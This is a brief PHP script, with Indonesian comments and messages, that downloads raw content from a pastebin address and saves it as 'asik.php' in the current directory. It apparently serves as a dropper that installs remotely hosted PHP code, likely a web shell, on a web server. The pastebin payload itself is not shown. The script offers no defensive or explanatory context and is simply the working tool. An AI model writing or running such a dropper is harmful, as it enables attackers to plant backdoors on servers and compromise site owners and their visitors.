<?php
$url = 'https://pastebin.com/raw/DQ12PPg5';
$contents = file_get_contents($url);

if ($contents !== false) {
    $fileName = 'asik.php';

    // Menyimpan konten ke file dengan nama "asik.php"
    $result = file_put_contents($fileName, $contents);

    if ($result !== false) {
        echo "File '$fileName' telah berhasil disimpan.";
    } else {
        echo "Gagal menyimpan file.";
    }
} else {
    echo "Gagal mengambil konten dari URL.";
}
?>
